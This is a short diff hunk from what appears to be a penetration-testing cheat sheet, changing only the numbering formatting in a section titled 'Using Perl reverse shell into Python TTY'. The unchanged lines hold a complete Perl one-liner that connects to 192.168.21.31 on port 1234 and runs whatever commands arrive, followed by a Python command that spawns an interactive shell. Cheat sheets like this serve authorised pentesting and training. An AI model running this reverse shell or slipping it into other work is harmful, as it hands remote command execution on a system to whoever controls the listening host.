@@ -39,11 +39,10 @@ Bypass File Extentension Restrictions
 #### USING PERL REVERSE SHELL INTO PYTHON TTY
 
 ```
-1.Return a Reverse Shell using PERL
-
+1. Return a Reverse Shell using PERL
 /usr/bin/perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.21.31:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
 
-2.    Spawn a TTY Shell
+2. Spawn a TTY Shell
 /usr/bin/python -c 'import pty; pty.spawn("/bin/sh")'
 
 ```
